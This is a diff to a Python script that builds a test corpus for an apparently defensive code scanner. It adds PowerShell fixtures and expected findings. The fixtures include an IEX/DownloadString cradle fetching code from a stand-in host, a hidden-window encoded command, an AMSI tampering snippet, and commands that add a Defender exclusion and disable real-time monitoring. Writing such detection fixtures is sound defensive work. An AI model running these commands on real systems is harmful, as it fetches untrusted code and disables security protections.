@@ -28,6 +28,7 @@ DISGUISED_DIR = os.path.join(CORPUS_DIR, 'disguised')
 PDF_DIR    = os.path.join(CORPUS_DIR, 'pdf')
 OFFICE_DIR = os.path.join(CORPUS_DIR, 'office')
 SHELL_DIR  = os.path.join(CORPUS_DIR, 'shell')
+PS_DIR     = os.path.join(CORPUS_DIR, 'powershell')
 os.makedirs(PYTHON_DIR, exist_ok=True)
 os.makedirs(NATIVE_DIR, exist_ok=True)
 os.makedirs(PYSRC_DIR, exist_ok=True)
@@ -36,6 +37,7 @@ os.makedirs(DISGUISED_DIR, exist_ok=True)
 os.makedirs(PDF_DIR, exist_ok=True)
 os.makedirs(OFFICE_DIR, exist_ok=True)
 os.makedirs(SHELL_DIR, exist_ok=True)
+os.makedirs(PS_DIR, exist_ok=True)
 
 RANDOM_SEED   = 13371337
 FIXED_ZIP_DT  = (2026, 1, 1, 0, 0, 0)
@@ -432,6 +434,34 @@ write_text(os.path.join(SHELL_DIR, 'sc_bugs.sh'),
     'fi\n')
 
 # ─────────────────────────────────────────────────────────────────────────────
+# PowerShell fixtures (v0.5)
+# ─────────────────────────────────────────────────────────────────────────────
+write_text(os.path.join(PS_DIR, 'clean.ps1'),
+    '[CmdletBinding()]\n'
+    'param([Parameter(Mandatory)][string]$Name)\n'
+    'Write-Output "Hello, $Name"\n')
+
+# Classic offensive-PowerShell downloader cradle: IEX + DownloadString
+write_text(os.path.join(PS_DIR, 'downloader.ps1'),
+    '$wc = New-Object System.Net.WebClient\n'
+    "IEX ($wc.DownloadString('http://example.test/payload.ps1'))\n")
+
+# Encoded command + hidden window
+write_text(os.path.join(PS_DIR, 'encoded.ps1'),
+    'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand '
+    'aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAKQA=\n')
+
+# Base64 decode + AMSI tampering
+write_text(os.path.join(PS_DIR, 'amsi.ps1'),
+    "$data = [System.Convert]::FromBase64String('cABheWxvYWQ=')\n"
+    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n")
+
+# Defender tampering
+write_text(os.path.join(PS_DIR, 'defender.ps1'),
+    'Add-MpPreference -ExclusionPath "C:\\\\temp\\\\payload"\n'
+    'Set-MpPreference -DisableRealtimeMonitoring $true\n')
+
+# ─────────────────────────────────────────────────────────────────────────────
 # Manifest
 # ─────────────────────────────────────────────────────────────────────────────
 manifest = {
@@ -475,6 +505,11 @@ manifest = {
         "shell/chmod777.sh":    {"expectFinding": "SHELL-CHMOD-777"},
         "shell/hardcoded_ip.sh":{"expectFinding": "SHELL-HARDCODED-IP"},
         "shell/sc_bugs.sh":     {"expectShellCheckFindings": True},
+        "powershell/clean.ps1":      {"expectRiskyCode": False},
+        "powershell/downloader.ps1": {"expectFinding": "PS-IEX"},
+        "powershell/encoded.ps1":    {"expectFinding": "PS-ENCODED-COMMAND"},
+        "powershell/amsi.ps1":       {"expectFinding": "PS-AMSI-TAMPER"},
+        "powershell/defender.ps1":   {"expectFinding": "PS-DEFENDER-TAMPER"},
     }
 }
 with open(os.path.join(CORPUS_DIR, 'manifest.json'), 'w') as f:
